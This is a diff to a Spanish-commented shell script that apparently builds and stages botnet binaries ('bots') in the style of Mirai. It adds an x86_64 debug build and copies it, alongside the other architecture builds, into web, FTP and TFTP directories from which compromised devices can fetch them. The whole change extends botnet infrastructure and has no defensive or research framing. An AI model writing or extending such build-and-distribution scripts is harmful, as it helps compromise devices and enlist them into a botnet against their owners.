@@ -34,6 +34,9 @@ echo "Compilando bots..."
 # Debug (i586 con símbolos)
 echo "  - debug (i586)"
 compile_bot i586 debug.dbg "-static -DDEBUG"
+# Dentro de la sección donde compilas cada arquitectura, después de las compilaciones normales
+echo "  - x86_64 (debug)"
+compile_bot x86_64 debug_x86_64.dbg "-static -DDEBUG"
 
 # Arquitecturas
 echo "  - x86"
@@ -77,5 +80,8 @@ cp release/debug.dbg /var/ftp/ 2>/dev/null
 
 cp release/main_* /var/lib/tftpboot/ 2>/dev/null
 cp release/debug.dbg /var/lib/tftpboot/ 2>/dev/null
+cp release/debug_x86_64.dbg /var/www/html/ 2>/dev/null
+cp release/debug_x86_64.dbg /var/ftp/ 2>/dev/null
+cp release/debug_x86_64.dbg /var/lib/tftpboot/ 2>/dev/null
 
 echo "Listo. Los bots están disponibles en /var/www/html, /var/ftp y /var/lib/tftpboot."
